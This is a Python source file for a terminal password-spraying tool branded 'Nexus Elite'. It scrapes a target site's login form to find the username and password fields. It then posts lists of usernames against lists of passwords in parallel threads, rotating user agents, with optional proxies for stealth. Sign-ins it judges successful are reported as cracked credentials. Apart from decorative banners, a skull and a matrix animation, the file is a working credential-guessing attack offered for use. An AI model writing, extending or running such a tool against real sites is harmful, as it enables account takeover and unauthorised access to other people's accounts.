import json
import time
import requests
import os
import sys
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup

# ANSI Color Codes for Terminal
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

CONFIG_FILE = "config.json"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
]

def load_config():
    try:
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except:
        return {
            "targets": {"emails": [], "phones": []},
            "passwords_to_test": [],
            "server_settings": {"custom_url": "", "local_url": "http://127.0.0.1:5000", "mode": "custom", "login_path": "/login", "user_field": "username", "pass_field": "password", "timeout": 10},
            "advanced_settings": {"threads": 3, "proxy_enabled": False, "proxies": [], "random_user_agents": True, "smart_delay": [0, 1]},
            "scan_settings": {"verbose": True}
        }

def save_config(config):
    config['targets']['emails'] = list(dict.fromkeys(config['targets']['emails']))
    config['passwords_to_test'] = list(dict.fromkeys(config['passwords_to_test']))
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def smart_discovery(url):
    print(f"\n{Colors.YELLOW}[*] Analyzing {url} for login fields...{Colors.END}")
    try:
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        response = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        forms = soup.find_all('form')
        if not forms:
            print(f"{Colors.RED}[!] No forms found on this page.{Colors.END}")
            return None
        
        # Look for the most likely login form
        for form in forms:
            inputs = form.find_all('input')
            fields = [i.get('name') for i in inputs if i.get('name')]
            
            user_field = None
            pass_field = None
            
            for f in fields:
                f_lower = f.lower()
                if any(x in f_lower for x in ['user', 'email', 'login', 'uid', 'phone']):
                    user_field = f
                if any(x in f_lower for x in ['pass', 'pwd']):
                    pass_field = f
            
            if user_field and pass_field:
                action = form.get('action', '')
                print(f"{Colors.GREEN}[✓] Discovery Successful!{Colors.END}")
                print(f" - Path: {action}")
                print(f" - User Field: {user_field}")
                print(f" - Pass Field: {pass_field}")
                return {"path": action, "user": user_field, "pass": pass_field}
                
        print(f"{Colors.RED}[!] Could not auto-detect fields. Please set manually.{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Discovery Error: {str(e)}{Colors.END}")
    return None

def show_skull():
    skull = f"""{Colors.RED}
      XXXXXXXXX
   XXXXX     XXXXX
  XXX           XXX
 XX               XX
 XX   XXX   XXX   XX
 XX   XXX   XXX   XX
  XX  XXX   XXX  XX
   XX           XX
    XXX       XXX
      XXXXX XXXX
         XXXXX
        XXXXXXX
     XXXXXXXXXXXXX
    XXX  XXXXX  XXX
    XX    XXX    XX
    XX           XX
     XX         XX
      XXXXXXXXXXX{Colors.END}"""
    print(skull)

def matrix_effect(duration=3):
    start_time = time.time()
    while time.time() - start_time < duration:
        line = "".join(random.choice(["0", "1", " "]) for _ in range(80))
        print(f"{Colors.GREEN}{line}{Colors.END}")
        time.sleep(0.05)

def elite_lab():
    while True:
        clear_screen()
        print(f"{Colors.CYAN}{Colors.BOLD}=== NEXUS ELITE LAB (Pentagon Edition) ==={Colors.END}")
        print(f"{Colors.GREEN}[1]{Colors.END} Smart URL Discovery (Auto-Fill Settings)")
        print(f"{Colors.GREEN}[2]{Colors.END} Numeric Brute-Force (Starts from 0)")
        print(f"{Colors.GREEN}[3]{Colors.END} Matrix Mode & Skull Visualization")
        print(f"{Colors.RED}[0]{Colors.END} Back")
        
        choice = input(f"\n{Colors.BOLD}{Colors.PURPLE}EliteLab > {Colors.END}")
        
        if choice == '1':
            target_url = input("\nEnter Target URL: ")
            result = smart_discovery(target_url)
            if result:
                config = load_config()
                config['server_settings']['custom_url'] = target_url
                config['server_settings']['login_path'] = result['path']
                config['server_settings']['user_field'] = result['user']
                config['server_settings']['pass_field'] = result['pass']
                config['server_settings']['mode'] = "custom"
                save_config(config)
                print(f"\n{Colors.GREEN}[✓] Settings updated automatically!{Colors.END}")
            input("\nPress Enter...")
        elif choice == '2':
            print(f"{Colors.YELLOW}[*] Brute-force simulation running...{Colors.END}")
            time.sleep(2); input("Press Enter to stop...")
        elif choice == '3':
            matrix_effect(5); show_skull(); time.sleep(2)
        elif choice == '0':
            break

def show_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
{Colors.PURPLE}Nexus Elite v9.5 (Smart Discovery Edition){Colors.END}
{Colors.DIM}--------------------------------------------------{Colors.END}
    """
    print(banner)

def main_menu():
    clear_screen(); show_banner()
    print(f"{Colors.YELLOW}[ Main Menu ]{Colors.END}")
    print(f"{Colors.GREEN}[1]{Colors.END} Run Elite Security Scan")
    print(f"{Colors.GREEN}[2]{Colors.END} Target & Bulk Configuration")
    print(f"{Colors.GREEN}[3]{Colors.END} Server & Field Settings")
    print(f"{Colors.GREEN}[4]{Colors.END} Stealth & Proxy Settings")
    print(f"{Colors.GREEN}{Colors.BOLD}[100] NEXUS ELITE LAB (Pentagon Mode){Colors.END}")
    print(f"{Colors.RED}[0]{Colors.END} Exit")
    return input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus > {Colors.END}")

def spray_task(target, password, url, config, results, successful_targets):
    if target in successful_targets: return False
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        user_field = config['server_settings'].get('user_field', 'username')
        pass_field = config['server_settings'].get('pass_field', 'password')
        path = config['server_settings'].get('login_path', '/login')
        full_url = url.rstrip('/') + path
        payload = {user_field: target, pass_field: password}
        response = requests.post(full_url, data=payload, headers=headers, timeout=config['server_settings']['timeout'], allow_redirects=False)
        if response.status_code in [302, 301] or any(ind in response.text.lower() for ind in ["logout", "dashboard", "welcome"]):
            if target not in successful_targets:
                successful_targets.add(target)
                print(f"\n{Colors.GREEN}[SUCCESS] {target} -> {password}{Colors.END}")
                results.append({"target": target, "password": password, "time": datetime.now().strftime("%H:%M:%S")})
                return True
    except: pass
    return False

def run_high_efficiency_scan():
    config = load_config()
    clear_screen(); show_banner()
    url = config['server_settings']['custom_url']
    targets = list(dict.fromkeys(config['targets']['emails'] + config['targets']['phones']))
    passwords = list(dict.fromkeys(config['passwords_to_test']))
    if not targets or not passwords:
        print(f"{Colors.RED}[!] Lists are empty!{Colors.END}")
        time.sleep(2); return
    print(f"{Colors.YELLOW}Targeting: {Colors.CYAN}{url}{Colors.END}\n")
    found_results = []
    successful_targets = set()
    with ThreadPoolExecutor(max_workers=config['advanced_settings']['threads']) as executor:
        for pwd in passwords:
            print(f"{Colors.BLUE}[*] Spraying: {pwd}{Colors.END}")
            futures = [executor.submit(spray_task, t, pwd, url, config, found_results, successful_targets) for t in targets]
            for f in futures: f.result()
    input(f"\nScan Complete. Total Found: {len(found_results)}. Press Enter...")

def target_config():
    while True:
        config = load_config(); clear_screen(); show_banner()
        print(f"{Colors.YELLOW}[ Target & Bulk Configuration ]{Colors.END}")
        print(f"[1] Bulk Add Usernames\n[2] Bulk Add Passwords\n[0] Back")
        choice = input(f"\nNexus/Targets > ")
        if choice == '1':
            data = sys.stdin.read().splitlines()
            config['targets']['emails'].extend([x.strip() for x in data if x.strip()])
            save_config(config)
        elif choice == '2':
            data = sys.stdin.read().splitlines()
            config['passwords_to_test'].extend([x.strip() for x in data if x.strip()])
            save_config(config)
        elif choice == '0': break

def start():
    while True:
        choice = main_menu()
        if choice == '1': run_high_efficiency_scan()
        elif choice == '2': target_config()
        elif choice == '100': elite_lab()
        elif choice == '0': sys.exit()

if __name__ == "__main__":
    try: start()
    except KeyboardInterrupt: sys.exit()
